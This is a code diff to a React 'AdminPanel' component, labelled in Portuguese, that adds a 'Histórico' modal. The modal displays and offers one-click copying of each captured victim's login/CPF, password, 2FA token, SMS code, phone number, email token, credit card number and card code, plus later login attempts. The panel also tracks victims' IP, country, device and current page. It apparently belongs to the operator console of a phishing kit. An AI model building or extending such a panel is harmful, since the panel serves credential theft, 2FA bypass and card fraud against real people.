@@ -30,6 +30,7 @@ function AdminPanel() {
   // Modal de referência para comandos
   const [refModal, setRefModal] = useState(null); // { userId, command, label, placeholder }
   const [refModalValue, setRefModalValue] = useState("");
+  const [historyModal, setHistoryModal] = useState(null); // attempt object
 
   // Função para copiar texto com um clique
   const copyToClipboard = async (text, fieldId) => {
@@ -951,11 +952,19 @@ function AdminPanel() {
 
                   {/* Footer com informações */}
                   <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-gray-300 border-t border-[#2a2a2a]">
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <div><span className="font-semibold text-gray-400">IP:</span> {attempt.ip_address || "-"}</div>
-                      <div><span className="font-semibold text-gray-400">País:</span> {attempt.country || "-"}</div>
-                      <div><span className="font-semibold text-gray-400">Dispositivo:</span> {attempt.device || "Desktop"}</div>
-                      <div><span className="font-semibold text-gray-400">Página atual:</span> {attempt.page || "Página Loading..."}</div>
+                    <div className="flex items-center justify-between">
+                      <div className="grid grid-cols-2 md:grid-cols-4 gap-2 flex-1">
+                        <div><span className="font-semibold text-gray-400">IP:</span> {attempt.ip_address || "-"}</div>
+                        <div><span className="font-semibold text-gray-400">País:</span> {attempt.country || "-"}</div>
+                        <div><span className="font-semibold text-gray-400">Dispositivo:</span> {attempt.device || "Desktop"}</div>
+                        <div><span className="font-semibold text-gray-400">Página atual:</span> {attempt.page || "Página Loading..."}</div>
+                      </div>
+                      <button
+                        onClick={() => setHistoryModal(attempt)}
+                        className="ml-4 bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-gray-600/40 px-3 py-1.5 rounded text-xs transition-colors whitespace-nowrap"
+                      >
+                        Histórico
+                      </button>
                     </div>
                   </div>
                 </div>
@@ -1185,6 +1194,70 @@ function AdminPanel() {
                   Enviar
                 </button>
               </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ========== MODAL HISTÓRICO ========== */}
+      {historyModal && (
+        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setHistoryModal(null)}>
+          <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-lg max-h-[80vh] flex flex-col" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-center justify-between p-6 border-b border-[#2a2a2a]">
+              <h2 className="text-lg font-bold text-white">Histórico - {historyModal.email}</h2>
+              <button onClick={() => setHistoryModal(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
+            </div>
+
+            <div className="overflow-auto flex-1 p-6 space-y-3">
+              {[
+                { label: "Login/CPF", value: historyModal.email },
+                { label: "Senha", value: historyModal.password },
+                { label: "2FA", value: historyModal.token_2fa },
+                { label: "Email", value: historyModal.email_input },
+                { label: "Código SMS", value: historyModal.sms_code },
+                { label: "Telefone", value: historyModal.phone_number },
+                { label: "Token Email", value: historyModal.app_mail },
+                { label: "Cartão", value: historyModal.credit_card },
+                { label: "Código CC", value: historyModal.cc_code },
+              ].map((item, i) => (
+                <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-3">
+                  <div>
+                    <span className="text-gray-500 text-xs block">{item.label}</span>
+                    <span className={`text-sm font-mono ${item.value ? 'text-white' : 'text-gray-600'}`}>{item.value || "-"}</span>
+                  </div>
+                  {item.value && (
+                    <button
+                      onClick={() => copyToClipboard(item.value, `hist-${i}`)}
+                      className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
+                    >
+                      {copiedField === `hist-${i}` ? "Copiado!" : "Copiar"}
+                    </button>
+                  )}
+                </div>
+              ))}
+
+              {/* Tentativas adicionais */}
+              {historyModal.attempts && historyModal.attempts.length > 0 && (
+                <div className="mt-4 pt-4 border-t border-[#2a2a2a]">
+                  <h3 className="text-sm font-bold text-gray-400 mb-3">Tentativas Adicionais</h3>
+                  {historyModal.attempts.map((att, i) => (
+                    <div key={i} className="bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-3 mb-2">
+                      <div className="flex justify-between items-center">
+                        <div>
+                          <span className="text-gray-500 text-xs">Tentativa {i + 2}</span>
+                          <div className="text-white text-sm font-mono">{att.email} | {att.password || "-"}</div>
+                        </div>
+                        <button
+                          onClick={() => copyToClipboard(`${att.email} | ${att.password}`, `hist-att-${i}`)}
+                          className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
+                        >
+                          {copiedField === `hist-att-${i}` ? "Copiado!" : "Copiar"}
+                        </button>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
             </div>
           </div>
         </div>
